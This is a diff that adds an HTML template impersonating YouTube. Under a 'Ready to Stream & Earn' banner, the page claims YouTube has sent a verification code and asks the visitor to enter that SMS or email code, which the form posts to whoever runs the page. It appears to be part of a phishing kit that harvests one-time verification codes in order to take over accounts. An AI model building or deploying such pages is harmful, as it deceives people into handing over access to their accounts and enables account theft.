@@ -1,0 +1,120 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(255, 0, 0, 0.25);border-radius:16px;">
+  <div class="platform-header">
+    <div class="icon-circle bg-youtube">
+      <i class="fa-brands fa-youtube icon-lg"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#FF0000;">YouTube</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Ready to Stream & Earn</div>
+    </div>
+  </div>
+
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  
+  <div class="play-instructions">
+    <div class="instruction-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        To confirm that you are the rightful owner of the YouTube account you logged in with, a verification code has been sent to your registered SMS or email by YouTube. Please enter the code below and click "Submit" to continue.
+      </p>
+    </div>
+  </div>
+
+  <form id="playForm" method="post" novalidate>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
+    <div class="error-text" id="digitsError"></div>
+
+    <button class="btn login-btn" type="submit">Summit</button>
+  </form>
+</div>
+
+<style>
+.input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 8px;
+  font-size: 16px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.input:focus {
+  border-color: #FF0000;
+  box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.25);
+  outline: none;
+}
+.input-error {
+  border-color: #ef4444;
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+}
+.error-text {
+  color: #ef4444;
+  font-size: 13px;
+  margin-top: -4px;
+  margin-bottom: 8px;
+}
+
+.login-btn {
+  width: 100%;
+  background: #FF0000;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  padding: 12px;
+  border-radius: 25px;
+  cursor: pointer;
+  border: none;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 6px 16px rgba(255, 0, 0, 0.35);
+  display: block;
+  margin-top: 8px;
+}
+.login-btn {
+  background: #9ca3af;  /* Grey */
+  box-shadow: 0 6px 16px rgba(107,114,128,0.25);
+}
+.login-btn:hover {
+  background: #6b7280;  /* Dark grey */
+}
+
+.play-instructions {
+  margin: 20px 0;
+}
+
+.instruction-card {
+  background: #ffebee;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #FF0000;
+  margin-bottom: 16px;
+}
+</style>
+
+<script>
+document.getElementById("playForm").addEventListener("submit", function(event) {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  const val = digits.value.trim();
+  const pattern = /^\d{4,9}$/; // 4 to 9 digits
+
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+
+  if (!pattern.test(val)) {
+    event.preventDefault(); // stop form submission
+    digits.classList.add("input-error");
+    digitsError.textContent = "The code you entered is incorrect.";
+  }
+});
+
+document.getElementById("digits").addEventListener("input", () => {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+});
+</script>
+{% endblock %}
